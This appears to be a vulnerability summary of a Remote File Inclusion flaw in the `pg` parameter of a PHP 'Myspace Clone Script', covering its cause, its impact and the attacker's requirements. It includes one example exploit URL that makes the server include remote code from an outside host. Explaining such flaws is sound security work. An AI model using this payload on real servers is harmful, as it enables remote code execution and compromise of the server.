Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause:**
The vulnerability stems from a lack of proper input sanitization in the `index.php` script of a Myspace Clone Script. Specifically, the `pg` parameter is vulnerable to Remote File Inclusion (RFI).

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The script directly includes the content from a URL provided in the `pg` parameter without sufficient validation, allowing an attacker to include malicious files from remote servers.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** An attacker can execute arbitrary code on the server by including a malicious PHP file from a remote server. This could lead to complete compromise of the server.
- **Data Theft:**  An attacker could potentially gain access to sensitive data stored on the server if they manage to execute code and gain access to the file system.
- **Website Defacement:** The attacker could alter the appearance or functionality of the website.
- **Malware Distribution:**  The compromised server could be used to host and distribute malware.

**Attack Vectors:**
- **HTTP GET Request:** The attacker sends a specially crafted HTTP GET request to `index.php`, including the `pg` parameter with a malicious URL. Example:  `http://victim/index.php?pg=http://www.sniper-sa.com/sn2.txt?`

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to have network access to the vulnerable server.
- **Knowledge of the vulnerable parameter:** The attacker needs to know that the `pg` parameter is vulnerable to RFI in the `index.php` file.
- **Hosting for a malicious file:** The attacker needs access to a server to host the malicious file that will be included by the vulnerable script.
